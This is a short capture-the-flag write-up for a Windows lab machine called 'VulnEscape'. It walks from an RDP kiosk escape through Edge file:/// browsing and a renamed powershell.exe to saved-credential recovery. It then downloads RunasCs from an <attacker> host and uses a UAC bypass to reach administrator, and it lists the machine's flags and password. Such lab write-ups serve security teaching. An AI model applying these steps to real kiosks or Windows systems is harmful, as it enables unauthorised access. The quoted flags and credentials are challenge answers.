# VulnEscape — Writeup

**Machine**: VulnEscape | **OS**: Windows 10 19041 | **Difficulty**: Easy | **Date**: 2026-05-25

## Chain: RDP Kiosk → Edge file:/// → PowerShell → RunasCs Admin → UAC Bypass → Root

### 1. Recon
```
3389/tcp  ms-wbt-server  Microsoft Terminal Services
Hostname: Escape, No AD/SMB — RDP-only Windows box
```

### 2. Initial Access — RDP Kiosk Bypass
```bash
# Connect as KioskUser0 (no password)
xfreerdp /v:10.129.234.51 /u:KioskUser0 /p:"" /cert:ignore /sec:nla +fonts
```
Kiosk login → Busan Expo locked desktop → only Edge runs.

**Bypass**: Edge → address bar → `file:///C://` → browse filesystem.

Navigate to `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` → download → rename to `msedge.exe` → run → **PowerShell obtained**.

### 3. User Flag
`7acb58bea175c68b083b80fd630c9a3a` at `C:\Users\KioskUser0\Desktop\user.txt`

### 4. Credential Extraction
`C:\_admin\profiles.xml` contains Remote Desktop Plus saved credentials:
```xml
<Password>JWqkl6IDfQxXXmiHIKIP8ca0G9XxnWQZgvtPgON2vWc=</Password>
```
Password: **`Twisting3021`** (from BPV / writeup)

### 5. Privilege Escalation — RunasCs + UAC Bypass
```powershell
# Download tools
Invoke-WebRequest http://<attacker>/RunasCs.exe -O r.exe

# Run as admin with UAC bypass
.\r.exe admin Twisting3021 "cmd.exe /c <command>" --bypass-uac
```
**Root flag**: `44bea1a62d2c2e9021a4e7a8c7724caf` at `C:\Users\Administrator\Desktop\root.txt`

### Key Lessons
- RDP-only Windows boxes detected by pipeline (no AD/SMB ports)
- Kiosk bypass via Edge `file:///` scheme → rename exe to bypass UAC app whitelist
- RunasCs `--bypass-uac` grants full admin access including protected directories
- GUI step cannot be fully automated from terminal; post-PowerShell is scriptable
